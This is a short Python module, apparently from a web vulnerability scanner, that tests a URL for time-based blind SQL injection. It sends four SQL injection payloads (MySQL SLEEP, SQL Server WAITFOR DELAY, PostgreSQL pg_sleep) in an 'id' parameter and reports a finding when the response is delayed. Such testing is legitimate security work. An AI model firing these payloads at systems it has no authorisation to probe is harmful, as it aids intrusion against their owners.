"""
Time-Based Blind SQL Injection Tester Module
Tests for blind SQL injection using time delays
"""
from typing import Dict, List
import requests
import time

class TimeBasedTester:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerabilities = []
        self.payloads = [
            "' AND SLEEP(5)--",
            "' OR SLEEP(5)--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND pg_sleep(5)--"
        ]
    
    def test_all(self) -> List[Dict]:
        """Run all time-based blind SQL injection tests"""
        for payload in self.payloads:
            result = self._test_payload(payload)
            if result:
                self.vulnerabilities.append(result)
        return self.vulnerabilities
    
    def _test_payload(self, payload: str) -> Dict:
        """Test single time-based payload"""
        try:
            start = time.time()
            response = requests.get(f"{self.target_url}?id={payload}", timeout=10)
            elapsed = time.time() - start
            
            if elapsed >= 5:
                return {
                    'type': 'Time-Based Blind SQL Injection',
                    'severity': 'HIGH',
                    'payload': payload,
                    'evidence': f'Response delayed by {elapsed:.2f} seconds'
                }
        except:
            pass
        return None
